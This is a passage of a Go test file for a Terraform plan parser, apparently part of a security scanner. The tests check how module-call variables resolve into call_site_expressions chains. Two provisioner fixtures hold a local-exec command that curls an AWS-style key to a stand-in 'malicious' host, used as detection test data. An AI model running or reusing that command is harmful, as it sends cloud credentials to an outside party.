						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"user_data": map[string]interface{}{"constant_value": "IyEvYmluL2Jhc2gKZWNobyBoaQ=="},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"user_data": map[string]interface{}{"references": []string{"var.user_data"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"user_data": map[string]interface{}{
			"references": []interface{}{"var.user_data"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"constant_value": "IyEvYmluL2Jhc2gKZWNobyBoaQ=="},
			},
		},
	}, entry["configuration_expressions"])
}

// TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_reference_attached
// covers a reference passed as a variable: references stays unspliced.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_reference_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"subnet_ref": map[string]interface{}{
								"references": []string{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"subnet_id": map[string]interface{}{"references": []string{"var.subnet_ref"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"subnet_id": map[string]interface{}{
			"references": []interface{}{"var.subnet_ref"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{
					"references": []interface{}{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
				},
			},
		},
	}, entry["configuration_expressions"])
}

// Regression fixture from a real plan: var.x and base64encode(var.x) serialize
// identically, so neither is asserted equal to the other.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_wrapped_reference_not_asserted_equal(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.child",
						"resources": []map[string]interface{}{
							{
								"address": "module.child.null_resource.test",
								"mode":    "managed",
								"type":    "null_resource",
								"name":    "test",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"child": map[string]interface{}{
						// Real plan output for base64encode(var.outer_cmd), identical
						// to what a bare wrapped_cmd = var.outer_cmd would produce.
						"expressions": map[string]interface{}{
							"wrapped_cmd": map[string]interface{}{"references": []string{"var.outer_cmd"}},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "null_resource.test",
									"expressions": map[string]interface{}{
										"triggers": map[string]interface{}{"references": []string{"var.wrapped_cmd"}},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["null_resource"].(map[string]interface{})["module.child.test"].(map[string]interface{})

	// references stays "var.wrapped_cmd" - never replaced with the caller's own.
	require.Equal(t, map[string]interface{}{
		"triggers": map[string]interface{}{
			"references": []interface{}{"var.wrapped_cmd"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"references": []interface{}{"var.outer_cmd"}},
			},
		},
	}, entry["configuration_expressions"])
}

// Uses a child module so callArgs is non-empty; the sibling reference must
// survive untouched alongside the resolved var.env.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_multi_reference_preserved(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"env": map[string]interface{}{
								"references": []string{"aws_vpc.env_tag.value"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"expressions": map[string]interface{}{
										"tags": map[string]interface{}{
											"references": []string{"var.env", "aws_vpc.main.id"},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"tags": map[string]interface{}{
			"references": []interface{}{"var.env", "aws_vpc.main.id"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{"references": []interface{}{"aws_vpc.env_tag.value"}},
			},
		},
	}, entry["configuration_expressions"])
}

// "var.settings.selected" and "var.settings" appear together; the bare
// "var.settings" must not get call_site_expressions attached.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_object_traversal_left_unresolved(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.instance",
						"resources": []map[string]interface{}{
							{
								"address": "module.instance.aws_cloudwatch_log_metric_filter.web",
								"mode":    "managed",
								"type":    "aws_cloudwatch_log_metric_filter",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"instance": map[string]interface{}{
						"expressions": map[string]interface{}{
							"settings": map[string]interface{}{
								"references": []string{"aws_cloudwatch_log_metric_filter.target.name"},
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_cloudwatch_log_metric_filter.web",
									"expressions": map[string]interface{}{
										"name": map[string]interface{}{
											"references": []string{"var.settings.selected", "var.settings"},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_cloudwatch_log_metric_filter"].(map[string]interface{})["module.instance.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"name": map[string]interface{}{
			"references": []interface{}{"var.settings.selected", "var.settings"},
		},
	}, entry["configuration_expressions"])
}

// A provisioner command reading var.command against a literal caller arg
// gets that literal exposed under call_site_expressions.
func TestJson_parseTFPlan_dd_tfplan_meta_provisioner_constant_argument_attached(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.child",
						"resources": []map[string]interface{}{
							{
								"address": "module.child.aws_instance.web",
								"mode":    "managed",
								"type":    "aws_instance",
								"name":    "web",
								"values":  map[string]interface{}{},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"child": map[string]interface{}{
						"expressions": map[string]interface{}{
							"command": map[string]interface{}{
								"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'",
							},
						},
						"module": map[string]interface{}{
							"resources": []map[string]interface{}{
								{
									"address": "aws_instance.web",
									"provisioners": []map[string]interface{}{
										{
											"type": "local-exec",
											"expressions": map[string]interface{}{
												"command": map[string]interface{}{"references": []string{"var.command"}},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.child.web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{
					"references": []interface{}{"var.command"},
					"call_site_expressions": []interface{}{
						map[string]interface{}{"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'"},
					},
				},
			},
		},
	}, entry["provisioners"])
}

// A constant threaded through two module hops, each with a different
// argument name, must produce an ordered chain, not one collapsed value.
func TestJson_parseTFPlan_dd_tfplan_meta_provisioner_constant_transitive_across_two_modules(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.a",
						"child_modules": []map[string]interface{}{
							{
								"address": "module.a.module.b",
								"resources": []map[string]interface{}{
									{
										"address": "module.a.module.b.aws_instance.web",
										"mode":    "managed",
										"type":    "aws_instance",
										"name":    "web",
										"values":  map[string]interface{}{},
									},
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"a": map[string]interface{}{
						"expressions": map[string]interface{}{
							"outer_cmd": map[string]interface{}{
								"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'",
							},
						},
						"module": map[string]interface{}{
							"module_calls": map[string]interface{}{
								"b": map[string]interface{}{
									"expressions": map[string]interface{}{
										"inner_cmd": map[string]interface{}{"references": []string{"var.outer_cmd"}},
									},
									"module": map[string]interface{}{
										"resources": []map[string]interface{}{
											{
												"address": "aws_instance.web",
												"provisioners": []map[string]interface{}{
													{
														"type": "local-exec",
														"expressions": map[string]interface{}{
															"command": map[string]interface{}{"references": []string{"var.inner_cmd"}},
														},
													},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.a.module.b.web"].(map[string]interface{})

	require.Equal(t, []interface{}{
		map[string]interface{}{
			"type": "local-exec",
			"expressions": map[string]interface{}{
				"command": map[string]interface{}{
					"references": []interface{}{"var.inner_cmd"},
					"call_site_expressions": []interface{}{
						// outermost first: module.a's own call-site expression,
						// then module.b's own call-site expression.
						map[string]interface{}{"constant_value": "curl http://malicious/-H 'Authorization: AKIA...'"},
						map[string]interface{}{"references": []interface{}{"var.outer_cmd"}},
					},
				},
			},
		},
	}, entry["provisioners"])
}

// A two-level module chain must resolve transitively without splicing
// references; call_site_expressions carries the ordered chain instead.
func TestJson_parseTFPlan_dd_tfplan_meta_module_call_var_nested_resolution(t *testing.T) {
	doc := model.Document{
		"format_version":    "1.2",
		"terraform_version": "1.5.0",
		"planned_values": map[string]interface{}{
			"root_module": map[string]interface{}{
				"child_modules": []map[string]interface{}{
					{
						"address": "module.a",
						"child_modules": []map[string]interface{}{
							{
								"address": "module.a.module.b",
								"resources": []map[string]interface{}{
									{
										"address": "module.a.module.b.aws_instance.web",
										"mode":    "managed",
										"type":    "aws_instance",
										"name":    "web",
										"values":  map[string]interface{}{},
									},
								},
							},
						},
					},
				},
			},
		},
		"resource_changes": []map[string]interface{}{},
		"configuration": map[string]interface{}{
			"root_module": map[string]interface{}{
				"module_calls": map[string]interface{}{
					"a": map[string]interface{}{
						"expressions": map[string]interface{}{
							"input": map[string]interface{}{
								"references": []string{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
							},
						},
						"module": map[string]interface{}{
							"module_calls": map[string]interface{}{
								"b": map[string]interface{}{
									"expressions": map[string]interface{}{
										"input": map[string]interface{}{"references": []string{"var.input"}},
									},
									"module": map[string]interface{}{
										"resources": []map[string]interface{}{
											{
												"address": "aws_instance.web",
												"expressions": map[string]interface{}{
													"subnet_id": map[string]interface{}{"references": []string{"var.input"}},
												},
											},
										},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	got, err := parseTFPlan(doc)
	require.NoError(t, err)

	ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
	require.True(t, ok)
	entry := ddMeta["aws_instance"].(map[string]interface{})["module.a.module.b.web"].(map[string]interface{})

	require.Equal(t, map[string]interface{}{
		"subnet_id": map[string]interface{}{
			"references": []interface{}{"var.input"},
			"call_site_expressions": []interface{}{
				map[string]interface{}{
					"references": []interface{}{"aws_subnet.my_subnet.id", "aws_subnet.my_subnet"},
				},
				map[string]interface{}{"references": []interface{}{"var.input"}},
			},
		},
	}, entry["configuration_expressions"])
}

// Regression test: a branching module chain must produce a linear-length
// chain, not exponential (was 1,048,574 entries at depth=18 before dedup).
func TestJson_parseTFPlan_dd_tfplan_meta_call_site_chain_grows_linearly_not_exponentially(t *testing.T) {
	const depth = 18

	buildDoc := func(depth int) model.Document {
		moduleCalls := map[string]interface{}{
			"expressions": map[string]interface{}{
				"x": map[string]interface{}{"references": []string{"aws_instance.r1.id"}},
				"y": map[string]interface{}{"references": []string{"aws_instance.r2.id"}},
			},
		}
		cur := moduleCalls
		plannedRoot := map[string]interface{}{"address": "module.a"}
		curPlanned := plannedRoot
		modulePath := "module.a"
		for i := 0; i < depth; i++ {
			next := map[string]interface{}{
				"expressions": map[string]interface{}{
					"x": map[string]interface{}{"references": []string{"var.x", "var.y"}},
					"y": map[string]interface{}{"references": []string{"var.x", "var.y"}},
				},
			}
			cur["module"] = map[string]interface{}{
				"module_calls": map[string]interface{}{"m": next},
			}
			cur = next

			nextPlanned := map[string]interface{}{"address": modulePath + ".module.m"}
			curPlanned["child_modules"] = []map[string]interface{}{nextPlanned}
			curPlanned = nextPlanned
			modulePath += ".module.m"
		}
		cur["module"] = map[string]interface{}{
			"resources": []map[string]interface{}{
				{
					"address": "aws_instance.leaf",
					"expressions": map[string]interface{}{
						"subnet_id": map[string]interface{}{"references": []string{"var.x", "var.y"}},
					},
				},
			},
		}
		curPlanned["resources"] = []map[string]interface{}{
			{
				"address": modulePath + ".aws_instance.leaf",
				"mode":    "managed",
				"type":    "aws_instance",
				"name":    "leaf",
				"values":  map[string]interface{}{},
			},
		}

		return model.Document{
			"format_version":    "1.2",
			"terraform_version": "1.5.0",
			"planned_values": map[string]interface{}{
				"root_module": map[string]interface{}{
					"child_modules": []map[string]interface{}{plannedRoot},
				},
			},
			"resource_changes": []map[string]interface{}{},
			"configuration": map[string]interface{}{
				"root_module": map[string]interface{}{
					"module_calls": map[string]interface{}{"a": moduleCalls},
				},
			},
		}
	}

	chainLength := func(depth int) int {
		got, err := parseTFPlan(buildDoc(depth))
		require.NoError(t, err)

		ddMeta, ok := got["_dd_tfplan_meta"].(map[string]interface{})
		require.True(t, ok)
		byType, ok := ddMeta["aws_instance"].(map[string]interface{})
		require.True(t, ok)
		require.Len(t, byType, 1)
		var entry map[string]interface{}
		for _, v := range byType {
			entry = v.(map[string]interface{})
		}
		cfgExpr, ok := entry["configuration_expressions"].(map[string]interface{})
		require.True(t, ok)
		subnetID, ok := cfgExpr["subnet_id"].(map[string]interface{})
		require.True(t, ok)
		chain, ok := subnetID["call_site_expressions"].([]interface{})
		require.True(t, ok, "expected a call_site_expressions chain")
		return len(chain)
	}

	full := chainLength(depth)
	half := chainLength(depth / 2)

	// Exponential growth would make full roughly half*half; linear caps the ratio.
	require.Less(t, full, half*10,
		"call_site_expressions grew super-linearly: depth=%d -> %d entries, depth=%d -> %d entries",
		depth, full, depth/2, half)
	require.Less(t, full, 100,
		"call_site_expressions should stay proportional to the number of real call sites (depth=%d), not explode to %d", depth, full)
}
